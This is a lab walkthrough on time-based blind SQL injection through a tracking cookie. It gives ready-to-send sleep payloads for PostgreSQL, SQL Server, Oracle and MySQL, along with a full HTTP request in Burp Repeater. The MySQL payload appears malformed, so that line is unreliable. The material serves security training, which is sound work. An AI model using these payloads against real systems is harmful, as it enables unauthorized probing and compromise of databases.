# SQL Injection - Lab #13: Blind SQL Injection with Time Delays

**YouTube Tutorial:** [SQL Injection - Lab #13 Blind SQL injection with time delays](https://www.youtube.com/watch?v=9l49BmQQVsw)

---

## 1. What is Time-Based Blind SQL Injection?

### Core Concept

In standard or boolean-based blind SQL injection, the application provides visual indicators (like output data, error messages, or conditional content like "Welcome back") that reveal whether an injected condition evaluates to true or false.

**Time-Based Blind SQL Injection** occurs when an application is vulnerable to SQL injection, but **returns identical HTTP responses regardless of whether the injected query succeeds, fails, or evaluates to true/false**. No conditional messages or errors are rendered on the page.

Because the response content remains entirely unchanged, an attacker must instruct the database to **pause or sleep for a specific duration** (e.g., 10 seconds) when executing the query:

* **If a delay occurs:** The database executed the injected command, confirming the presence of a SQL injection vulnerability.
* **If response is instant:** The injected function was ignored, invalid for that database engine, or failed syntax parsing.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Parameter:** The `TrackingId` cookie sent with HTTP requests to the application.
* **Blind SQL Injection Mechanism:** The application processes the `TrackingId` cookie in a backend SQL query. It suppresses all database errors and displays identical HTML content regardless of query execution results.
* **Time Delay Behavior:** The database engine processes injected sleep functions synchronously before building the HTTP response, causing the server response time to increase directly by the specified delay duration.

### Root Cause & Impact

* **Root Cause:** Direct string concatenation of user-controlled cookie values into backend SQL statements without parameterization or prepared statements.
* **Goal:** Prove the existence of a time-based blind SQL injection vulnerability by causing a **10-second response delay**.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Database Engine Identification):** Test DBMS-specific time delay syntax (PostgreSQL, Oracle, Microsoft SQL Server, MySQL) using string concatenation (`||` or `;`) to identify which database backend handles the request.
* **Phase 2 (Delay Triggering):** Inject a payload specifying a 10-second execution pause (`pg_sleep(10)` for PostgreSQL).
* **Phase 3 (Verification):** Monitor the response timer in Burp Suite Repeater to verify that the server takes ~10,000 milliseconds (10 seconds) to return the response.

### Server Behavior

* **Normal Query Execution:** Server responds almost instantaneously (~50–200 milliseconds).
* **Injected Time Delay Query:** Server holds the socket connection open while the database engine executes the sleep command, completing the request only after the full delay timer elapses.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept Request in Burp Suite

1. Visit the target lab home page in your browser.
2. Intercept the HTTP request using **Burp Suite Proxy** (or locate it in HTTP history).
3. Send the request to **Burp Suite Repeater** (`Ctrl + R` / `Cmd + R`).

---

### Step 2: Test Database-Specific Time Delay Payloads

Different database management systems (DBMS) use different built-in functions to trigger execution delays. Test payloads by appending them to the `TrackingId` cookie value:

#### PostgreSQL

```http
Cookie: TrackingId=vulnerable_cookie%27%7C%7C%28SELECT+pg_sleep%2810%29%29--

```

* **Raw Payload:** `x' || (SELECT pg_sleep(10))--`

#### Microsoft SQL Server

```http
Cookie: TrackingId=vulnerable_cookie%27%3BWAITFOR+DELAY+%270%3A0%3A10%27--

```

* **Raw Payload:** `x'; WAITFOR DELAY '0:0:10'--`

#### Oracle

```http
Cookie: TrackingId=vulnerable_cookie%27%7C%7Cdbms_pipe.receive_message%28%27a%27%2C10%29--

```

* **Raw Payload:** `x' || dbms_pipe.receive_message('a',10)--`

#### MySQL

```http
Cookie: TrackingId=vulnerable_cookie%27%7C%7CSELECT+sleep%2810%29--

```

* **Raw Payload:** `x' || SELECT sleep(10)--`

---

### Step 3: Trigger and Verify the 10-Second Delay

1. In Burp Repeater, modify the `TrackingId` cookie using the **PostgreSQL** time delay payload:

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
User-Agent: Mozilla/5.0
Cookie: TrackingId=vulnerable_cookie%27+%7C%7C+%28SELECT+pg_sleep%2810%29%29--

```

2. Click **Send**.
3. Observe the response clock at the bottom right corner of Burp Repeater:
* **Response Time:** `~10,120 ms` (approx. 10.1 seconds).


4. Since the server delayed response delivery by 10 seconds, the vulnerability is confirmed and the lab is solved.

---

## 5. Pro-Tips & Common Pitfalls

* **Concatenation Operators Vary:** Always test appropriate string concatenation operators for the target SQL flavor (`||` for PostgreSQL/Oracle, `+` or `;` for SQL Server).
* **URL Encoding is Critical:** Ensure special characters like spaces (`+` or `%20`), single quotes (`%27`), and pipe characters (`%7C`) inside cookies are properly URL-encoded so the HTTP request remains valid.
* **Network Latency Overhead:** Actual response times will include normal network round-trip time in addition to the sleep value (e.g., a 10-second sleep may take 10.2 seconds total).
* **Subquery Parentheses:** Wrapping time delay functions inside subquery syntax like `(SELECT pg_sleep(10))` ensures clean expression evaluation within standard `WHERE` clause logic.